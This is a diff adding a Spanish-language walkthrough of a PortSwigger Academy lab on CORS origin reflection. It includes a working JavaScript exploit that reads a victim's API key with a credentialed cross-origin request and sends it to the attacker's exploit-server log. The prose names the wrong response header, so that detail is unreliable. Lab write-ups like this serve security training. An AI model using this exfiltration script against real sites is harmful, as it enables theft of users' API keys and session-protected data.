@@ -679,6 +679,25 @@ Cuando se carga el `iframe`, después de medio segundo (para que se cargue el co
 
 ## [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
 
+### [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+
+Al autenticarnos en este laboratorio e ir a la sección Account Details, vemos que se imprime el apikey. Yendo a burpsuite y analizando la petición y respuesta que se envían al entrar a esta sección, vemos que en el encabezado  de la respuesta Access-Control-Allow-Credentials se devuelve el dominio de nuestro lab. Volviendo a la request y mandándola al repeater de burpsuite, si manualmente colocamos un encabezado Origin disitinto, el encabezado Access-Control-Allow-Credentials de la respuesta devolverá el dominio del origin.
+
+Para resolver este lab, copiamos la url de la sección Home, y le anexamos "accountDetails" (debido a que a esta url se hacen las peticiones que devuelve la apikey, se puede ver analizando el HTTP History de burpsuite), y la pegamos en el siguiente script.
+Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas del servidor yendo a la sección Acces log. Una vez allí, buscamos "log?key", y lo que sigue será el apikey que debemos enviar.
+
+```javascript
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://ac0d1f601f36270f80786122008800b8.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+    var x = JSON.parse(this.responseText);
+    location='/log?key='+ x.apikey;
+};
+```
+
 ---
 
 ## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
